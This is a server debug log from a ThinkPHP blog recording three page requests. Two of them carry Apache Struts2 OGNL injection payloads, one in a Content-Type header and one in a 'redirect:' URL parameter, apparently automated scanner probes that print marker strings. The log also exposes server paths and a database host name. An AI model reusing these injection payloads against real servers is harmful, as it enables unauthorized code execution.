---------------------------------------------------------------
[ 2018-02-11T01:44:33+08:00 ] 121.42.77.167 39.106.197.192 GET /blog/home/editor/article_list/sign/20
[ info ] www.zhangheteng.com/blog/home/editor/article_list/sign/20 [运行时间：0.144051s][吞吐率：6.94req/s] [内存消耗：3,444.30kb] [文件加载：56]
[ info ] [ LANG ] /data/home/qxu1141810136/htdocs/blog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'editor',
    2 => 'article_list',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.zhangheteng.com',
  'referer' => 'http://www.zhangheteng.com/blog/home/editor/article_list/sign/20',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; cs-CZ) AppleWebKit/525.28.3 (KHTML, like Gecko) Version/3.2.3 Safari/525.29',
)
[ info ] [ PARAM ] array (
  'sign' => '20',
)
[ info ] [ RUN ] app\home\controller\Editor->article_list[ /data/home/qxu1141810136/htdocs/blog/application/home/controller/Editor.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ CACHE ] INIT File
[ info ] [ VIEW ] /data/home/qxu1141810136/htdocs/blog/application/home/view/editor/article_list.html [ array (
  0 => 'list',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.004234s ] mysql:host=qdm191867626.my3w.com;port=3306;dbname=qdm191867626_db;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `summary_editor` [ RunTime:0.002078s ]
[ sql ] [ SQL ] SELECT * FROM `summary_editor` WHERE  `id` = 20 LIMIT 1 [ RunTime:0.003004s ]
[ sql ] [ SQL ] UPDATE `summary_editor`  SET `page_view`=253  WHERE  `id` = 20 [ RunTime:0.086196s ]
---------------------------------------------------------------
[ 2018-02-11T01:44:34+08:00 ] 121.42.77.167 39.106.197.192 GET /blog/home/editor/article_list/sign/20
[ info ] www.zhangheteng.com/blog/home/editor/article_list/sign/20 [运行时间：0.060408s][吞吐率：16.55req/s] [内存消耗：3,446.41kb] [文件加载：56]
[ info ] [ LANG ] /data/home/qxu1141810136/htdocs/blog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'editor',
    2 => 'article_list',
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#matt= #context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.setContentType(\'text/plain\'),#matt.getWriter().println ("6627968a-be6d-461f-a380-0d6868731c28"),#matt.getWriter().flush(),#matt.getWriter().close())}',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
  'host' => 'www.zhangheteng.com',
  'referer' => 'http://www.zhangheteng.com/blog/home/editor/article_list/sign/20',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
)
[ info ] [ PARAM ] array (
  'sign' => '20',
)
[ info ] [ RUN ] app\home\controller\Editor->article_list[ /data/home/qxu1141810136/htdocs/blog/application/home/controller/Editor.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ CACHE ] INIT File
[ info ] [ VIEW ] /data/home/qxu1141810136/htdocs/blog/application/home/view/editor/article_list.html [ array (
  0 => 'list',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.003619s ] mysql:host=qdm191867626.my3w.com;port=3306;dbname=qdm191867626_db;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `summary_editor` [ RunTime:0.001787s ]
[ sql ] [ SQL ] SELECT * FROM `summary_editor` WHERE  `id` = 20 LIMIT 1 [ RunTime:0.002361s ]
[ sql ] [ SQL ] UPDATE `summary_editor`  SET `page_view`=254  WHERE  `id` = 20 [ RunTime:0.006988s ]
---------------------------------------------------------------
[ 2018-02-11T01:44:34+08:00 ] 121.42.77.167 39.106.197.192 GET /blog/home/editor/article_list/sign/20?redirect:$%7B%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.setContentType('text/plain'),%23matt.getWriter().println%20('successsuccess'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D
[ info ] www.zhangheteng.com/blog/home/editor/article_list/sign/20?redirect:$%7B%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.setContentType('text/plain'),%23matt.getWriter().println%20('successsuccess'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D [运行时间：0.060535s][吞吐率：16.52req/s] [内存消耗：3,446.06kb] [文件加载：56]
[ info ] [ LANG ] /data/home/qxu1141810136/htdocs/blog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'editor',
    2 => 'article_list',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
  'host' => 'www.zhangheteng.com',
  'referer' => 'http://www.zhangheteng.com/blog/home/editor/article_list/sign/20?redirect:$%7B%23matt%3d%20%23context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),%23matt.setContentType(\'text/plain\'),%23matt.getWriter().println%20(\'successsuccess\'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
)
[ info ] [ PARAM ] array (
  'redirect:${#matt=_#context_get(\'com_opensymphony_xwork2_dispatcher_HttpServletResponse\'),#matt_setContentType(\'text/plain\'),#matt_getWriter()_println_(\'successsuccess\'),#matt_getWriter()_flush(),#matt_getWriter()_close()}' => '',
  'sign' => '20',
)
[ info ] [ RUN ] app\home\controller\Editor->article_list[ /data/home/qxu1141810136/htdocs/blog/application/home/controller/Editor.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ CACHE ] INIT File
[ info ] [ VIEW ] /data/home/qxu1141810136/htdocs/blog/application/home/view/editor/article_list.html [ array (
  0 => 'list',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.003943s ] mysql:host=qdm191867626.my3w.com;port=3306;dbname=qdm191867626_db;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `summary_editor` [ RunTime:0.002048s ]
[ sql ] [ SQL ] SELECT * FROM `summary_editor` WHERE  `id` = 20 LIMIT 1 [ RunTime:0.002369s ]
[ sql ] [ SQL ] UPDATE `summary_editor`  SET `page_view`=255  WHERE  `id` = 20 [ RunTime:0.007525s ]
